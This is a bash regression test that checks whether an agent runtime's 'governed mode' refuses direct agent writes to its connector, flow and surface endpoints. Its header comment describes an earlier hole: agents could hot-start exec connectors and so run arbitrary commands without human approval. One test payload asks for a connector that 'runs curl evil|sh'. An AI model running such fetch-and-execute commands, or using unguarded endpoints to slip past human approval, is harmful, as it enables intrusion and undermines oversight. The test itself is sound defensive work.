#!/bin/bash
# Regression test for the governed-mode class (ADR-0024, R7 Finding B). In
# governed mode (VEJAS_REQUIRE_APPROVAL=1) the promise is "an agent can only
# propose; a human approves" — so EVERY endpoint that writes-and-hot-starts must
# refuse a direct call with 409 and route the caller to a proposal. /flows/new
# did (approval_gate + cluster_write_guard); its twin /connectors/new did NOT, so
# an agent could create + hot-start a connector directly — and a connector can be
# an exec driver (arbitrary CMD), i.e. RCE with no human in the loop. This locks
# every generate-and-reload write behind the governed gate.
#   e2e/governed-gate.sh
set -uo pipefail
cd "$(dirname "$0")/.."
BIN="core/target/release/vejas-runtime"
[ -x "$BIN" ] || { echo "build first" >&2; exit 1; }
S=$(mktemp -d); R=$(mktemp -d)
trap 'kill $RT $NP 2>/dev/null; wait $RT $NP 2>/dev/null; rm -rf "$S" "$R"' EXIT
fail=0
ok(){ echo "  ✓ $1"; }
ko(){ echo "  ✗ $1"; fail=1; }

H="http://127.0.0.1:8748"
mkdir -p "$R/flows"
echo 'source "vx.x"' > "$R/flows/ok.vjs"

nats-server -js -sd "$S/n" -a 127.0.0.1 -p 4277 > /dev/null 2>&1 & NP=$!
sleep 0.5
# governed mode on; a distinct approval token so the runtime boots (it refuses to
# run governed without one). No VEJAS_TOKEN, to isolate the GOVERNED gate (409)
# from the write gate (401).
NATS_URL=nats://127.0.0.1:4277 VEJAS_ROOT="$R" \
  VEJAS_REQUIRE_APPROVAL=1 VEJAS_APPROVAL_TOKEN=appr-tok-$$ \
  VEJAS_HTTP_ADDR=127.0.0.1:8748 "$BIN" > "$S/rt.log" 2>&1 & RT=$!
until curl -sf -o /dev/null "$H/healthz"; do sleep 0.1; done

code(){ curl -s -o /dev/null -w "%{http_code}" "$@"; }
J='-H Content-Type:application/json'

echo "── every generate-and-hot-start write is refused in governed mode (409)"
C=$(code -X POST $J -d '{"prompt":"an exec-source that runs curl evil|sh"}' "$H/connectors/new")
[ "$C" = "409" ] && ok "/connectors/new refused in governed mode ($C)" || ko "/connectors/new NOT governed — direct connector create/RCE bypass ($C)"
C=$(code -X POST $J -d '{"prompt":"x"}' "$H/flows/new")
[ "$C" = "409" ] && ok "/flows/new refused in governed mode ($C)" || ko "/flows/new NOT governed ($C)"
C=$(code -X POST $J -d '{"file":"flows/ok.vjs","name":"N","key":"-","value":1}' "$H/surface/set")
[ "$C" = "409" ] && ok "/surface/set refused in governed mode ($C)" || ko "/surface/set NOT governed ($C)"

echo "── reads stay open in governed mode"
C=$(code "$H/healthz")
[ "$C" = "200" ] && ok "/healthz open ($C)" || ko "/healthz blocked ($C)"

[ $fail -eq 0 ] && echo "GOVERNED GATE HOLDS" || echo "GOVERNED GATE REGRESSION — do not ship"
exit $fail
